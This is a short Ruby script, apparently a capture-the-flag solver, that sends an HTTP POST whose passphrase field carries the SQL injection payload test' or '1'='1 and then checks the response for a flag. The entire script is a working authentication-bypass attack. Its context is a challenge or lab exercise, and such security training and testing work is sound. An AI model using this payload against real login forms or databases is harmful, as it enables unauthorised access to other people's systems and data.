require 'httparty'
require_relative 'libronsolve'

result = HTTParty.post(get_url(), body: { 'passphrase' => "test' or '1'='1" })

if result.success?
  check_flag(result.parsed_response, terminate: true, partial: true)
else
  puts "Something went wrong: #{ result.parsed_response }"
  exit(1)
end
